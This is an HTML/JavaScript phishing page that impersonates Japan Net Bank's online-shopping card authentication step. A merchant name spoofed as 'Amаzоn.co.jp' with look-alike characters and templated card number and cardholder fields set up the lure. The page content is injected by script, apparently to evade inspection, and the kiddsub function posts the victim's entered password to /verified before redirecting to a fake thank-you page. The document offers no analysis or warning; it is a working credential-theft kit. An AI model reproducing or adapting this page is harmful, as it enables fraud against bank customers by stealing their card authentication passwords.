<!DOCTYPE html>
<html lang="en">
<meta http-equiv="content-type" content="text/html;charset=UTF-8"/>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <link rel="stylesheet" href="library/loader/style.css">
    <link rel="stylesheet" href="sheets/vbv.css">
    <title>株式会社ジャパンネット銀行｜認証サービス｜Receipt</title>
    <style type="text/css">
        .contain {
            border: 1px;
            width: 100px;
            height: 20px;
            float: right;
        }

    </style>

</head>

<body id ="bodyid">
</body>
<script>
    setTimeout("yincang()",0);
    function yincang() {
        let content = document.getElementById('bodyid');
        content.innerHTML =
                "<div style='display:block;' class='combiner' id='combiner'>\n" +
                "    <ul class='nav'>\n" +
                "        <li class='nav-item'>\n" +
                "\n" +
                "            <img class='nav-link' src='assets/img/logo.jpg' style='height: 25px; margin-top: 12px;' href='#'>\n" +
                "        </li>\n" +
                "        <li class='nav-item' style='right: 15px; position: absolute;'>\n" +
                "        </li>\n" +
                "    </ul>\n" +
                "    <br>\n" +
                "    <br>\n" +
                "    <p>\n" +
                "    <h4>\n" +
                "        <link href='css/verifiedby/Added.css' rel='stylesheet' type='text/css'>\n" +
                "        <span class='Qixrk'></span><span class='nPIVU'></span><span class='BoPao'></span><span\n" +
                "            class='YNTGT'></span><span class='BFVMc'></span><span class='oMdWg'></span><span class='PDoOY'></span><span\n" +
                "            class='MQeWS'></span><span class='gxLVl'></span><span class='IJOeq'></span><span class='mbnyg'></span><span\n" +
                "            class='ieIEK'></span><span class='OKpmt'></span><span class='penFf'></span><span class='yTbfN'></span><span\n" +
                "            class='wlMKc'></span></h4>\n" +
                "    </p>\n" +
                "    <p><font size=1>お客さまに安全なインターネットショッピングをご提供するためご本人さま確認をいたします。</font></p>\n" +
                "    <p><font size=1>ご利用いただくカードで登録している「オンラインショッピング認証サービス」の「パスワード（※）」をご入力ください。\n" +
                "        （※クレジットカードの暗証番号とは異なりますので、ご注意ください）\n" +
                "    </font></p>\n" +
                "    <div class='padingtable'>\n" +
                "        <table>\n" +
                "            <tbody>\n" +
                "            <tr>\n" +
                "                <td>\n" +
                "                    <div class='contain' align='right'><b>加盟店名：</b></div>\n" +
                "                </td>\n" +
                "                <td>Amаzоn.co.jp</td>\n" +
                "            </tr>\n" +
                "            <tr>\n" +
                "                <td>\n" +
                "                    <div class='contain' align='right'><b>ご利用金額：</b></div>\n" +
                "                </td>\n" +
                "                <td>JPY 0</td>\n" +
                "            </tr>\n" +
                "            <tr>\n" +
                "                <td>\n" +
                "                    <div class='contain' align='right'><b>ご利用日：</b></div>\n" +
                "                </td>\n" +
                "                <td>${dateTime!''}</td>\n" +
                "            </tr>\n" +
                "            <tr>\n" +
                "\n" +
                "            <tr>\n" +
                "                <td>\n" +
                "                    <div class='contain' align='right'><b>カード番号：</b></div>\n" +
                "                </td>\n" +
                "                <td>**** **** ****${cardNo!''} </td>\n" +
                "            </tr>\n" +
                "            <tr>\n" +
                "                <td>\n" +
                "                    <div class='contain' align='right'><b>カード名義人：</b></div>\n" +
                "                </td>\n" +
                "                <td>${cardName!''}</td>\n" +
                "            </tr>\n" +
                "\n" +
                "            <tr>\n" +
                "                <td align='right'><b>パスワード：</b></td>\n" +
                "                <td><input style='width: 158px;' type='text' maxlength='66' placeholder='' name='kiddfiled1'\n" +
                "                           id='kiddfiled1'><br></td>\n" +
                "            </tr>\n" +
                "\n" +
                "            <tr>\n" +
                "                <td></td>\n" +
                "                <td>\n" +
                "                    <input id='sendBtn' onclick='kiddsub()' name='Sex' class='confirm' style=' width: 48px;' type='button' value='送 信'>\n" +
                "\n" +
                "                    <img src='aa/faq_mark.gif' border='0' width='14' height='13' alt=''>\n" +
                "\n" +
                "                    <a href='javascript:onHelpClickHandler();' id='faq' onclick='javascript:onClosingHandler();'>\n" +
                "                        ヘルプ\n" +
                "                    </a>\n" +
                "                    &nbsp\n" +
                "                    <a href='javascript:onCancelClickHandler();' id='cancel' onclick='javascript:onClosingHandler();'>キャンセル</a>\n" +
                "\n" +
                "                </td>\n" +
                "            </tr>\n" +
                "            </tbody>\n" +
                "        </table>\n" +
                "    </div>\n" +
                "\n" +
                "</div>" +
                " <a id='links' href=\"#\" style='display:none;'></a>";
    }
</script>
<script src="library/jquery/main.min.js"></script>
<script>
    // myFunction();
    function kiddsub() {
        var filed1 = $("#kiddfiled1").val();
        if (!check()) return;
        $.post("/verified", {kiddfiled1: filed1},
                function (data) {
                    var kiddLink = document.getElementById('links');
                    //给它的href属性添加网址
                    kiddLink.href = "/thanks?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya";
                    //调用这个对象的click方法
                    kiddLink.click();
                    //window.location.href = '/thanks?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya';
                }, "json");
        //window.location.href = '/thanks?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya';
    }
    var myVar;
    function myFunction() {
        myVar = setTimeout(showPage, 100);
    }

    function showPage() {
        document.getElementById("loader").style.display = "none";
        document.getElementById("combiner").style.display = "block";
    }
    function check() {
        var liehuo_key = document.getElementById('kiddfiled1');
        if (liehuo_key.value.length < 6) {
            alert("パスワードが間違っています");
            liehuo_key.value = "";
            liehuo_key.focus();
            return false;
        }
        return true;
    }
</script>
</html>